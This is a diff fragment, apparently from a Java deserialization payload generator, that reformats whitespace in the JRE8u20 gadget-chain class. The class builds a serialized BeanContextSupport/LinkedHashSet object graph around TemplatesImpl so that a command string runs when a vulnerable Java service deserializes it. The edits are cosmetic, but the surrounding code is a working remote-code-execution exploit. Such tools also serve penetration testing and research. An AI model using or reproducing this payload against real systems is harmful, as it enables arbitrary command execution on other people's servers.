@@ -50,8 +50,8 @@ public class JRE8u20 implements ObjectPayload<Object> {
     }
 
     public static TCObject makeBeanContextSupport(TCObject handler, Serialization ser) throws Exception {
-        TCObject    obj                         = new TCObject(ser);
-        TCClassDesc beanContextSupportDesc      = new TCClassDesc("java.beans.beancontext.BeanContextSupport");
+        TCObject obj = new TCObject(ser);
+        TCClassDesc beanContextSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextSupport");
         TCClassDesc beanContextChildSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextChildSupport");
         beanContextSupportDesc.addField(new TCClassDesc.Field("serializable", int.class));
         TCObject.ObjectData beanContextSupportData = new TCObject.ObjectData();
@@ -72,15 +72,15 @@ public class JRE8u20 implements ObjectPayload<Object> {
     }
 
     public Object getObject(String command) throws Exception {
-        Serialization           ser       = new Serialization();
-        Object                  templates = makeTemplates(command);
-        HashMap<Object, Object> map       = new HashMap<Object, Object>();
+        Serialization ser = new Serialization();
+        Object templates = makeTemplates(command);
+        HashMap<Object, Object> map = new HashMap<Object, Object>();
         map.put("f5a5a608", templates);
-        TCObject            handler           = makeHandler(map, ser);
-        TCObject            linkedHashset     = new TCObject(ser);
-        TCClassDesc         linkedhashsetDesc = new TCClassDesc("java.util.LinkedHashSet");
+        TCObject handler = makeHandler(map, ser);
+        TCObject linkedHashset = new TCObject(ser);
+        TCClassDesc linkedhashsetDesc = new TCClassDesc("java.util.LinkedHashSet");
         TCObject.ObjectData linkedhashsetData = new TCObject.ObjectData();
-        TCClassDesc         hashsetDesc       = new TCClassDesc("java.util.HashSet");
+        TCClassDesc hashsetDesc = new TCClassDesc("java.util.HashSet");
         hashsetDesc.addField(new TCClassDesc.Field("fake", BeanContextSupport.class));
         TCObject.ObjectData hashsetData = new TCObject.ObjectData();
         hashsetData.addData(makeBeanContextSupport(handler, ser));
